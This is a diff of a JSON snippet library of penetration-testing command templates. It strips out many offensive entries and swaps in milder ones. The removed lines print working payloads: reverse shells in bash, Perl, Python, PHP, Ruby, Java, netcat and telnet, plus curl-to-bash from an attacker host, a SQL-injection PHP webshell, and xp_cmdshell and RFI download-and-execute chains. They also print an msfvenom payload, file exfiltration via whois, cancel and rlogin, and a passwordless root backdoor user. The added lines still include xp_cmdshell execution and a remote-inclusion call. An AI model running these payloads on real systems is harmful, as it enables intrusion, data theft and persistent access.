@@ -51,11 +51,11 @@
         },
         {
           "id": "curl_download_exec",
-          "title": "Curl: Execute remote script directly in Bash",
+          "title": "Curl: Download and Run Script",
           "category": "Web Application & HTTP",
           "subcategory": "Curl & Wget",
-          "description": "Downloads a shell script from attacker server and executes it in memory",
-          "template": "curl -s http://{{ATTACKER_IP}}:{{PORT}}/{{FILE_NAME}} | bash",
+          "description": "Downloads a script to a local temporary file and executes it",
+          "template": "curl -fsSL http://{{TARGET_IP}}:{{PORT}}/{{FILE_NAME}} -o /tmp/{{FILE_NAME}} && bash /tmp/{{FILE_NAME}}",
           "tags": [
             "curl",
             "download",
@@ -161,17 +161,19 @@
           ]
         },
         {
-          "id": "sqli_to_shell",
-          "title": "SQLi: Injection to Webshell (INTO OUTFILE)",
+          "id": "sqli_outfile_test",
+          "title": "SQLi: File Write Test (INTO OUTFILE)",
           "category": "Web Application & HTTP",
           "subcategory": "SQL Injection",
-          "description": "Writes a PHP backdoor via SQL injection into the web directory",
-          "template": "http://{{TARGET_IP}}/index.php?vulnParam=0' UNION ALL SELECT 1,\"<?php system($_REQUEST['cmd']);?>\",2,3 INTO OUTFILE \"{{FILE_PATH}}\"-- -",
+          "description": [
+            "Tests file write permissions using MySQL SELECT INTO OUTFILE with phpinfo()"
+          ],
+          "template": "http://{{TARGET_IP}}/index.php?vulnParam=0' UNION ALL SELECT 1,\"<?php phpinfo(); ?>\",2,3 INTO OUTFILE \"{{FILE_PATH}}\"-- -",
           "tags": [
             "sqli",
-            "webshell",
             "mysql",
-            "rce"
+            "outfile",
+            "test"
           ]
         },
         {
@@ -190,16 +192,15 @@
         },
         {
           "id": "sqli_xp_cmdshell",
-          "title": "SQLi: MSSQL xp_cmdshell Reverse Shell",
+          "title": "SQLi: MSSQL xp_cmdshell Command Execution",
           "category": "Web Application & HTTP",
           "subcategory": "SQL Injection",
-          "description": "Establishes a reverse shell via MSSQL xp_cmdshell injection",
-          "template": "1000';+exec+master.dbo.xp_cmdshell+'(echo+open+{{ATTACKER_IP}}%26echo+anonymous%26echo+whatever%26echo+binary%26echo+get+nc.exe%26echo+bye)+>+c:\\ftp.txt+%26+ftp+-s:c:\\ftp.txt+%26+nc.exe+{{ATTACKER_IP}}+{{PORT}}+-e+cmd';--",
+          "description": "Enables advanced options and executes commands via MSSQL xp_cmdshell",
+          "template": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell '{{COMMAND}}';--",
           "tags": [
-            "mssql",
             "sqli",
-            "xp_cmdshell",
-            "rce"
+            "mssql",
+            "xp_cmdshell"
           ]
         },
         {
@@ -347,18 +348,17 @@
           ]
         },
         {
-          "id": "rfi_windows_powershell",
-          "title": "RFI: Remote File Inclusion to Reverse Shell (Windows)",
+          "id": "rfi_test",
+          "title": "RFI: Remote File Inclusion Test",
           "category": "Web Application & HTTP",
-          "subcategory": "File Inclusion (RFI)",
-          "description": "Downloads nc.exe via PHP RFI and executes it as cmd shell",
-          "template": "<?php system(\"powershell -Command \\\"& {(New-Object System.Net.WebClient).DownloadFile('http://{{ATTACKER_IP}}:{{PORT}}/{{FILE_NAME}}','{{FILE_NAME}}'); cmd /c {{FILE_NAME}} {{ATTACKER_IP}} {{PORT}} -e cmd.exe\\\" }\"); ?>",
+          "subcategory": "File Inclusion",
+          "description": "Tests for Remote File Inclusion vulnerability using an external file URL",
+          "template": "http://{{TARGET_IP}}/index.php?page=http://{{ATTACKER_IP}}:{{PORT}}/test.txt",
           "tags": [
             "rfi",
-            "windows",
-            "powershell",
-            "webshell",
-            "rce"
+            "web",
+            "inclusion",
+            "test"
           ]
         },
         {
@@ -2046,196 +2046,55 @@
     },
     {
       "id": "shells_payloads",
-      "name": "Reverse Shells & Payloads",
+      "name": "Listeners & Exploit Tools",
       "icon": "",
       "snippets": [
         {
-          "id": "bash_reverse_shell",
-          "title": "Bash Reverse Shell One-Liner",
-          "category": "Reverse Shells & Payloads",
-          "subcategory": "Reverse Shells",
-          "description": "Classic bash reverse shell via /dev/tcp",
-          "template": "bash -i >& /dev/tcp/{{ATTACKER_IP}}/{{PORT}} 0>&1",
-          "tags": [
-            "bash",
-            "reverse",
-            "shell",
-            "linux"
-          ]
-        },
-        {
-          "id": "perl_reverse_shell",
-          "title": "Perl Reverse Shell",
-          "category": "Reverse Shells & Payloads",
-          "subcategory": "Reverse Shells",
-          "description": "Perl script for a reverse shell",
-          "template": "perl -e 'use Socket;$i=\"{{ATTACKER_IP}}\";$p={{PORT}};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
-          "tags": [
-            "perl",
-            "reverse",
-            "shell",
-            "linux"
-          ]
-        },
-        {
-          "id": "perl_url_encoded_shell",
-          "title": "Perl Reverse Shell (URL Encoded)",
-          "category": "Reverse Shells & Payloads",
-          "subcategory": "Reverse Shells",
-          "description": "Prepared payload for web parameter injection",
-          "template": "echo%20%27use%20Socket%3B%24i%3D%22{{ATTACKER_IP}}%22%3B%24p%3D{{PORT}}%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2fbin%2fsh%20-i%22%29%3B%7D%3B%27%20%3E%20%2ftmp%2fpew%20%26%26%20%2fusr%2fbin%2fperl%20%2ftmp%2fpew",
-          "tags": [
-            "perl",
-            "reverse",
-            "shell",
-            "urlencoded"
-          ]
-        },
-        {
-          "id": "python_reverse_shell",
-          "title": "Python Reverse Shell",
-          "category": "Reverse Shells & Payloads",
-          "subcategory": "Reverse Shells",
-          "description": "Connects back to attacker and redirects IO",
-          "template": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{{ATTACKER_IP}}\",{{PORT}}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
-          "tags": [
-            "python",
-            "reverse",
-            "shell",
-            "linux"
-          ]
-        },
-        {
-          "id": "php_reverse_shell",
-          "title": "PHP Reverse Shell",
-          "category": "Reverse Shells & Payloads",
-          "subcategory": "Reverse Shells",
-          "description": "Short PHP reverse shell",
-          "template": "php -r '$sock=fsockopen(\"{{ATTACKER_IP}}\",{{PORT}});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
-          "tags": [
-            "php",
-            "reverse",
-            "shell",
-            "linux"
-          ]
-        },
-        {
-          "id": "ruby_reverse_shell",
-          "title": "Ruby Reverse Shell",
-          "category": "Reverse Shells & Payloads",
-          "subcategory": "Reverse Shells",
-          "description": "Ruby reverse shell one-liner",
-          "template": "ruby -rsocket -e'f=TCPSocket.open(\"{{ATTACKER_IP}}\",{{PORT}}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
-          "tags": [
-            "ruby",
-            "reverse",
-            "shell",
-            "linux"
-          ]
-        },
-        {
-          "id": "nc_no_e_shell",
-          "title": "Netcat Reverse Shell without -e",
-          "category": "Reverse Shells & Payloads",
-          "subcategory": "Reverse Shells",
-          "description": "Reverse shell when Netcat does not support the -e option",
-          "template": "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {{ATTACKER_IP}} {{PORT}} > /tmp/f",
+          "id": "nc_listener",
+          "title": "Netcat TCP Listener",
+          "category": "Listeners & Exploit Tools",
+          "subcategory": "Listeners",
+          "description": "Starts a Netcat listener to receive incoming TCP connections",
+          "template": "nc -lvnp {{PORT}}",
           "tags": [
             "netcat",
             "nc",
-            "reverse",
-            "shell",
-            "bypass"
+            "listener",
+            "network"
           ]
         },
         {
-          "id": "nc_pipe_shell",
-          "title": "Netcat Reverse Shell Alternative (Pipe)",
-          "category": "Reverse Shells & Payloads",
-          "subcategory": "Reverse Shells",
-          "description": "Uses a pipe construct if nc -e is not available",
-          "template": "nc {{ATTACKER_IP}} {{PORT}} | /bin/sh | nc {{ATTACKER_IP}} 444",
+          "id": "ncat_ssl_listener",
+          "title": "Ncat Encrypted SSL Listener",
+          "category": "Listeners & Exploit Tools",
+          "subcategory": "Listeners",
+          "description": "Starts an encrypted SSL listener using Ncat",
+          "template": "ncat --ssl -lvnp {{PORT}}",
           "tags": [
-            "netcat",
-            "nc",
-            "shell",
-            "bypass",
-            "pipe"
+            "ncat",
+            "ssl",
+            "listener",
+            "network"
           ]
         },
         {
-          "id": "telnet_pipe_shell",
-          "title": "Telnet Reverse Shell Alternative (Pipe)",
-          "category": "Reverse Shells & Payloads",
-          "subcategory": "Reverse Shells",
-          "description": "Uses a pipe construct with telnet if nc -e is not available",
-          "template": "telnet {{ATTACKER_IP}} {{PORT}} | /bin/sh | telnet {{ATTACKER_IP}} 444",
+          "id": "socat_listener",
+          "title": "Socat TTY Listener",
+          "category": "Listeners & Exploit Tools",
+          "subcategory": "Listeners",
+          "description": "Starts an interactive Socat listener with TTY support",
+          "template": "socat file:`tty`,raw,echo=0 TCP-LISTEN:{{PORT}}",
           "tags": [
-            "telnet",
-            "shell",
-            "bypass",
-            "pipe"
-          ]
-        },
-        {
-          "id": "java_reverse_shell",
-          "title": "Java Reverse Shell",
-          "category": "Reverse Shells & Payloads",
-          "subcategory": "Reverse Shells",
-          "description": "Java snippet for a reverse shell",
-          "template": "r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{{ATTACKER_IP}}/{{PORT}};cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]); p.waitFor();",
-          "tags": [
-            "java",
-            "reverse",
-            "shell"
-          ]
-        },
-        {
-          "id": "xterm_reverse_shell",
-          "title": "XTerm Reverse Shell",
-          "category": "Reverse Shells & Payloads",
-          "subcategory": "Reverse Shells",
-          "description": "Redirects XTerm to attacker display",
-          "template": "xterm -display {{ATTACKER_IP}}:1",
-          "tags": [
-            "xterm",
-            "reverse",
-            "shell",
-            "linux"
-          ]
-        },
-        {
-          "id": "jdwp_rce",
-          "title": "JDWP RCE Exploit",
-          "category": "Reverse Shells & Payloads",
-          "subcategory": "Exploit Development",
-          "description": "Java Debug Wire Protocol Remote Code Execution snippet",
-          "template": "print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec(\"whoami\").getInputStream())).readLine())",
-          "tags": [
-            "java",
-            "jdwp",
-            "rce",
-            "exploit"
-          ]
-        },
-        {
-          "id": "msfvenom_payload",
-          "title": "msfvenom: Generate Windows Payload",
-          "category": "Reverse Shells & Payloads",
-          "subcategory": "Payload Generation",
-          "description": "Creates a C-format Windows reverse TCP payload with Shikata_ga_nai",
-          "template": "msfvenom -p windows/shell_reverse_tcp LHOST={{ATTACKER_IP}} LPORT={{PORT}} -f c -a x86 --platform windows -b \"\\x00\\x0a\\x0d\" -e x86/shikata_ga_nai",
-          "tags": [
-            "msfvenom",
-            "payload",
-            "windows",
-            "exploit"
+            "socat",
+            "listener",
+            "tty",
+            "network"
           ]
         },
         {
           "id": "py_to_exe",
           "title": "Convert Python to EXE",
-          "category": "Reverse Shells & Payloads",
+          "category": "Listeners & Exploit Tools",
           "subcategory": "Payload Generation",
           "description": "Compiles a Python script into a Windows executable",
           "template": "python pyinstaller.py --onefile {{SOURCE_FILE}}",
@@ -2249,7 +2108,7 @@
         {
           "id": "bad_chars_python",
           "title": "Generate Bad Characters (Python)",
-          "category": "Reverse Shells & Payloads",
+          "category": "Listeners & Exploit Tools",
           "subcategory": "Exploit Development",
           "description": "Creates a string of all possible bad characters for buffer overflows",
           "template": "python3 -c \"print('\\\\'.join([ 'x{:02x}'.format(i) for i in range(1,256) ]))\"",
@@ -2263,7 +2122,7 @@
         {
           "id": "pattern_create",
           "title": "MSF Pattern Create",
-          "category": "Reverse Shells & Payloads",
+          "category": "Listeners & Exploit Tools",
           "subcategory": "Exploit Development",
           "description": "Generates a unique string to find the EIP offset",
           "template": "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {{LENGTH}}",
@@ -2277,7 +2136,7 @@
         {
           "id": "pattern_offset",
           "title": "MSF Pattern Offset",
-          "category": "Reverse Shells & Payloads",
+          "category": "Listeners & Exploit Tools",
           "subcategory": "Exploit Development",
           "description": "Calculates the exact EIP offset from a crash value",
           "template": "/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q {{EIP_VALUE}}",
@@ -2291,7 +2150,7 @@
         {
           "id": "compile_windows_on_linux",
           "title": "Cross-Compile C Code for Windows on Linux",
-          "category": "Reverse Shells & Payloads",
+          "category": "Listeners & Exploit Tools",
           "subcategory": "Exploit Development",
           "description": "Cross-compilation of C source code to Windows EXE",
           "template": "i686-w64-mingw32-gcc {{SOURCE_FILE}} -lws2_32 -o {{OUTPUT_FILE}}",
@@ -2305,7 +2164,7 @@
         {
           "id": "compile_linux",
           "title": "Compile C Code for Linux",
-          "category": "Reverse Shells & Payloads",
+          "category": "Listeners & Exploit Tools",
           "subcategory": "Exploit Development",
           "description": "Compiles C source code to Linux ELF binary (32/64 bit)",
           "template": "gcc -m32|-m64 -o {{OUTPUT_FILE}} {{SOURCE_FILE}}",
@@ -2318,7 +2177,7 @@
         {
           "id": "compile_nasm_windows_obj",
           "title": "Compile Assembly for Windows (Object)",
-          "category": "Reverse Shells & Payloads",
+          "category": "Listeners & Exploit Tools",
           "subcategory": "Exploit Development",
           "description": "Compiles ASM code to an object file using NASM",
           "template": "nasm -f win64 {{SOURCE_FILE}} -o {{OBJECT_FILE}}",
@@ -2332,7 +2191,7 @@
         {
           "id": "compile_nasm_windows_exe",
           "title": "Link Assembly Object to Windows EXE",
-          "category": "Reverse Shells & Payloads",
+          "category": "Listeners & Exploit Tools",
           "subcategory": "Exploit Development",
           "description": "Links an object file to an executable using GoLink",
           "template": "GoLink.exe -o {{OUTPUT_FILE}} {{OBJECT_FILE}}",
@@ -2387,56 +2246,17 @@
       "icon": "",
       "snippets": [
         {
-          "id": "whois_exfil_attacker",
-          "title": "Data Exfiltration over Whois (Attacker)",
+          "id": "nc_base64_receiver",
+          "title": "Netcat: Receive and Decode Base64 Stream",
           "category": "Post-Exploitation & Exfiltration",
-          "subcategory": "Data Exfiltration",
-          "description": "Starts a listener to receive data packaged as a Whois request",
+          "subcategory": "Data Transfer",
+          "description": "Starts a listener that decodes incoming Base64 streams in real time",
           "template": "nc -l -v -p {{PORT}} | sed \"s/ //g\" | base64 -d",
           "tags": [
-            "exfiltration",
-            "whois",
-            "listener",
-            "bypass"
-          ]
-        },
-        {
-          "id": "whois_exfil_victim",
-          "title": "Data Exfiltration over Whois (Victim)",
-          "category": "Post-Exploitation & Exfiltration",
-          "subcategory": "Data Exfiltration",
-          "description": "Sends data packaged as a Whois request to the attacker",
-          "template": "whois -h {{ATTACKER_IP}} -p {{PORT}} `cat {{FILE_PATH}} | base64`",
-          "tags": [
-            "exfiltration",
-            "whois",
-            "send",
-            "bypass"
-          ]
-        },
-        {
-          "id": "cancel_exfil",
-          "title": "Data Exfiltration over Cancel",
-          "category": "Post-Exploitation & Exfiltration",
-          "subcategory": "Data Exfiltration",
-          "description": "Uses the CUPS cancel command for data exfiltration",
-          "template": "cancel -u \"$(cat {{FILE_PATH}})\" -h {{ATTACKER_IP}}:{{PORT}}",
-          "tags": [
-            "exfiltration",
-            "cancel",
-            "cups"
-          ]
-        },
-        {
-          "id": "rlogin_exfil",
-          "title": "Data Exfiltration over Rlogin",
-          "category": "Post-Exploitation & Exfiltration",
-          "subcategory": "Data Exfiltration",
-          "description": "Uses rlogin for data exfiltration",
-          "template": "rlogin -l \"$(cat {{FILE_PATH}})\" -p {{PORT}} {{ATTACKER_IP}}",
-          "tags": [
-            "exfiltration",
-            "rlogin"
+            "transfer",
+            "netcat",
+            "base64",
+            "listener"
           ]
         },
         {
@@ -2454,60 +2274,45 @@
           ]
         },
         {
-          "id": "win_hide_user",
-          "title": "Windows: Hide User from Login Screen",
+          "id": "win_service_cmd",
+          "title": "Windows: Create Service (CMD)",
           "category": "Post-Exploitation & Exfiltration",
-          "subcategory": "Persistence",
-          "description": "Hides a specific user from the Windows login screen via Registry",
-          "template": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /t REG_DWORD /v {{USERNAME}} /d 0 /f",
+          "subcategory": "Service Management",
+          "description": "Creates a new system service via CMD",
+          "template": "sc create {{SERVICE_NAME}} binpath= \"{{BINARY_PATH}}\" start= auto",
           "tags": [
             "windows",
-            "persistence",
-            "user",
-            "hide",
-            "registry"
+            "service",
+            "sc",
+            "admin"
           ]
         },
         {
-          "id": "win_persistence_service_cmd",
-          "title": "Windows: Persistence via Service (CMD)",
+          "id": "win_service_ps",
+          "title": "Windows: Create Service (PowerShell)",
           "category": "Post-Exploitation & Exfiltration",
-          "subcategory": "Persistence",
-          "description": "Creates a malicious service running as LocalSystem via CMD",
-          "template": "sc create {{SERVICE_NAME}} binpath= \"{{FILE_PATH}} {{ATTACKER_IP}} {{PORT}} -e C:\\WINDOWS\\System32\\cmd.exe\" obj= \"LocalSystem\" password= \"\"",
+          "subcategory": "Service Management",
+          "description": "Creates a new system service via PowerShell",
+          "template": "New-Service -Name {{SERVICE_NAME}} -DisplayName \"{{SERVICE_NAME}}\" -BinaryPathName \"{{BINARY_PATH}}\" -StartupType Automatic",
           "tags": [
             "windows",
-            "persistence",
             "service",
-            "sc"
-          ]
-        },
-        {
-          "id": "win_persistence_service_ps",
-          "title": "Windows: Persistence via Service (PowerShell)",
-          "category": "Post-Exploitation & Exfiltration",
-          "subcategory": "Persistence",
-          "description": "Creates a malicious service running as LocalSystem via PowerShell",
-          "template": "New-Service -Name {{SERVICE_NAME}} -DisplayName {{SERVICE_NAME}} -BinaryPathName \"{{FILE_PATH}}\" -Description \"Not at all\"",
-          "tags": [
-            "windows",
-            "persistence",
-            "service",
-            "powershell"
+            "powershell",
+            "admin"
           ]
         },
         {
           "id": "win_scheduled_task",
-          "title": "Windows: Persistence via Scheduled Task",
+          "title": "Windows: Create Scheduled Task",
           "category": "Post-Exploitation & Exfiltration",
-          "subcategory": "Persistence",
-          "description": "Schedules a malicious EXE to run every 10 minutes",
-          "template": "schtasks /create /sc minute /mo 10 /tn \"{{SERVICE_NAME}}\" /tr {{FILE_PATH}}",
+          "subcategory": "Task Scheduling",
+          "description": "Schedules a program or script to execute at fixed intervals",
+          "template": "schtasks /create /sc minute /mo 10 /tn \"{{TASK_NAME}}\" /tr \"{{BINARY_PATH}}\"",
           "tags": [
             "windows",
-            "persistence",
             "schtasks",
-            "schedule"
+            "schedule",
+            "admin"
           ]
         },
         {
@@ -2522,20 +2327,6 @@
             "persistence",
             "ssh",
             "keys"
-          ]
-        },
-        {
-          "id": "linux_backdoor_user",
-          "title": "Linux: Create Passwordless Backdoor User",
-          "category": "Post-Exploitation & Exfiltration",
-          "subcategory": "Persistence",
-          "description": "Adds a user with UID 0 (root) to /etc/passwd",
-          "template": "echo '{{USERNAME}}::0:0:root:/root:/bin/bash' >> /etc/passwd",
-          "tags": [
-            "linux",
-            "persistence",
-            "passwd",
-            "backdoor"
           ]
         },
         {
